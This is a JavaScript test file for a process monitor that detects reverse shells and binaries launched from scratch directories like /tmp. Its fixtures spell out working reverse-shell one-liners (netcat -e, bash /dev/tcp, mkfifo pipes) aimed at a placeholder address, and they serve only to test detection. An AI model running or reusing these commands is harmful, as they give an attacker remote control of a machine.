import { describe, it, expect } from 'vitest';
import { isSuspiciousProcess, createProcessMonitor } from '../src/processMonitor.js';

describe('isSuspiciousProcess', () => {
  it('flags common reverse-shell command patterns', () => {
    expect(isSuspiciousProcess({ cmdline: 'nc -e /bin/sh 203.0.113.5 4444' })).toBe(true);
    expect(isSuspiciousProcess({ cmdline: 'bash -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1' })).toBe(true);
    expect(isSuspiciousProcess({ cmdline: 'python3 -c import socket,subprocess,os;s=socket.socket()' })).toBe(true);
    expect(isSuspiciousProcess({ cmdline: 'mkfifo /tmp/f; cat /tmp/f | /bin/sh | nc 203.0.113.5 4444' })).toBe(true);
  });

  it('flags a process running from a world-writable scratch directory', () => {
    expect(isSuspiciousProcess({ cmdline: './payload', exePath: '/tmp/payload' })).toBe(true);
    expect(isSuspiciousProcess({ cmdline: './payload', exePath: '/dev/shm/payload' })).toBe(true);
  });

  it('does not flag ordinary commands', () => {
    expect(isSuspiciousProcess({ cmdline: 'node server.js', exePath: '/usr/bin/node' })).toBe(false);
    expect(isSuspiciousProcess({ cmdline: 'nginx: worker process' })).toBe(false);
    expect(isSuspiciousProcess({ cmdline: 'ls -la', exePath: '/bin/ls' })).toBe(false);
  });
});

function makeFakeProc(pidMapRef) {
  return {
    readdir: () => Object.keys(pidMapRef.current),
    readFileText: (path) => {
      const pid = path.match(/\/proc\/(\d+)\/cmdline/)[1];
      const entry = pidMapRef.current[pid];
      if (!entry) throw new Error('ENOENT');
      return entry.cmdline.split(' ').join('\0') + '\0';
    },
    readlink: (path) => {
      const pid = path.match(/\/proc\/(\d+)\/exe/)[1];
      const entry = pidMapRef.current[pid];
      if (!entry || !entry.exePath) throw new Error('EACCES');
      return entry.exePath;
    },
  };
}

describe('createProcessMonitor', () => {
  it('establishes a baseline on the first check without flagging anything', () => {
    const pidMapRef = { current: { 100: { cmdline: 'node server.js', exePath: '/usr/bin/node' } } };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    expect(monitor.check()).toEqual([]);
  });

  it('does not flag a new but ordinary process', () => {
    const pidMapRef = { current: { 100: { cmdline: 'node server.js', exePath: '/usr/bin/node' } } };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    monitor.check(); // baseline
    pidMapRef.current[200] = { cmdline: 'ls -la', exePath: '/bin/ls' };
    expect(monitor.check()).toEqual([]);
  });

  it('flags a new process matching a reverse-shell pattern', () => {
    const pidMapRef = { current: { 100: { cmdline: 'node server.js', exePath: '/usr/bin/node' } } };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    monitor.check(); // baseline
    pidMapRef.current[666] = { cmdline: 'nc -e /bin/sh 203.0.113.5 4444' };
    const flagged = monitor.check();
    expect(flagged).toHaveLength(1);
    expect(flagged[0]).toMatchObject({ pid: 666, cmdline: 'nc -e /bin/sh 203.0.113.5 4444' });
  });

  it('flags a new process running from /tmp even with an innocuous-looking command', () => {
    const pidMapRef = { current: {} };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    monitor.check(); // baseline
    pidMapRef.current[777] = { cmdline: './update', exePath: '/tmp/update' };
    const flagged = monitor.check();
    expect(flagged).toHaveLength(1);
    expect(flagged[0].pid).toBe(777);
  });

  it('does not re-flag a suspicious process that was already running at baseline', () => {
    const pidMapRef = { current: { 666: { cmdline: 'nc -e /bin/sh 203.0.113.5 4444' } } };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    monitor.check(); // baseline already includes the suspicious process
    expect(monitor.check()).toEqual([]);
  });

  it('stops flagging a pid once it has been seen, even across many checks', () => {
    const pidMapRef = { current: {} };
    const monitor = createProcessMonitor(makeFakeProc(pidMapRef));
    monitor.check();
    pidMapRef.current[666] = { cmdline: 'nc -e /bin/sh 203.0.113.5 4444' };
    expect(monitor.check()).toHaveLength(1);
    expect(monitor.check()).toEqual([]);
  });

  it('degrades to empty when /proc is unavailable (non-Linux host)', () => {
    const monitor = createProcessMonitor({ readdir: () => { throw new Error('ENOENT'); } });
    expect(monitor.check()).toEqual([]);
    expect(monitor.check()).toEqual([]);
  });
});
